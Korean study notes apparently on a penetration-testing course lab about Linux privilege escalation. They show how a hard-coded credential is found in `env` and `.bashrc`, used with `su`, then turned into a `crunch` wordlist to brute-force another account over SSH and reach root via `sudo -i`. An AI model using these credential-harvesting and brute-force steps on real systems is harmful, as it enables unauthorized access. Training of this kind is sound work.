# 18.2.1 사용자 흔적 조사

> **Inspecting User Trails** · PEN-200 §18.2.1

시간이 제한된 실전에서는 손쉬운 표적부터 봄. 사용자 히스토리 파일·설정 파일에 평문 활동 기록이 남아 패스워드나 인증 자료가 그대로 드러나는 경우가 흔함.

- **닷파일(dotfile)** — 이름이 `.` 로 시작해 기본 목록 명령에 안 보이는 사용자별 설정 파일·디렉터리. 안 보인다는 이유로 관리가 느슨함
- `.bashrc` — 로그인 세션에서 새 터미널이나 새 셸이 뜰 때 실행되는 bash 스크립트. 여기에 환경 변수를 선언해 두면 그 사용자의 셸이 생성될 때마다 자동 설정됨
- 관리자가 인증이 필요한 커스텀 스크립트와 주고받으려고 **자격 증명을 환경 변수에 박아 두는** 사례가 있음. 안전한 방식은 공개키 인증 + 개인키 패스프레이즈임

절차는 두 단계임 — `env` 로 현재 환경 변수를 훑어 값이 패스워드처럼 보이는 항목을 찾고, 그 변수가 `.bashrc` 에 `export` 로 선언돼 있는지 확인해 **일시적인 값이 아니라 셸마다 상시 주입되는 값**임을 확정함. 실습 대상에서는 `SCRIPT_CREDENTIALS=lab` 이 그 항목이었음.

*`env` 출력 — 값이 패스워드처럼 보이는 `SCRIPT_CREDENTIALS` 가 섞여 있음*

```
joe@debian-privesc:~$ env
...
XDG_SESSION_CLASS=user
TERM=xterm-256color
SCRIPT_CREDENTIALS=lab
USER=joe
LC_TERMINAL_VERSION=3.4.16
SHLVL=1
XDG_SESSION_ID=35
LC_CTYPE=UTF-8
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=192.168.118.2 59808 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
MAIL=/var/mail/joe
SSH_TTY=/dev/pts/1
OLDPWD=/home/joe/.cache
_=/usr/bin/env
```

*`.bashrc` — 그 변수가 `export` 로 선언돼 새 셸마다 주입됨을 확인*

```
joe@debian-privesc:~$ cat .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples
# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac
# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
export SCRIPT_CREDENTIALS="lab"
HISTCONTROL=ignoreboth
...
```

찾은 값을 우선 그대로 `su` 에 넣어 봄.

```
joe@debian-privesc:~$ su - root
Password:
root@debian-privesc:~# whoami
root
```

발견한 자격 증명은 직접 대입 외에 **사전 생성의 씨앗**으로도 씀. 사람이 만든 패스워드는 같은 어근을 재사용하는 경향이 있어, 알아낸 `lab` 을 기준으로 `Lab` + 숫자 3자리 패턴을 만들어 다른 계정(eve)에 브루트포싱함. `crunch` 는 최소·최대 길이를 앞에 두고 `-t` 로 패턴을 지정함(`%` = 숫자 한 자리).

```
kali@kali:~$ crunch 6 6 -t Lab%%% > wordlist
```

생성된 워드리스트를 확인함.

```
kali@kali:~$ cat wordlist

Lab001
Lab002
Lab003
Lab004

...
```

찾은 패스워드로 eve 계정에 SSH 로 붙음.

```
kali@kali:~$ ssh eve@192.168.50.214
eve@192.168.50.214's password:
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
...
eve@debian-privesc:~$
```

새 계정으로 붙었으면 곧바로 `sudo -l` 로 그 계정의 sudo 권한을 확인함. eve 는 관리 계정이었음.

```
eve@debian-privesc:~$ sudo -l
[sudo] password for eve:
Matching Defaults entries for eve on debian-privesc:
    env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User eve may run the following commands on debian-privesc:
    (ALL : ALL) ALL
```

`(ALL : ALL) ALL` 은 임의 명령을 임의 사용자로 실행 가능하다는 뜻이라 `sudo -i` 에 eve 자신의 패스워드만 넣으면 root 셸이 됨.

```
eve@debian-privesc:~$ sudo -i
[sudo] password for eve:
root@debian-privesc:/home/eve# whoami
root
```

같은 대상에 root 로 가는 경로가 둘 이상 존재할 수 있으므로, 하나가 통했다고 열거를 멈추지 말 것.
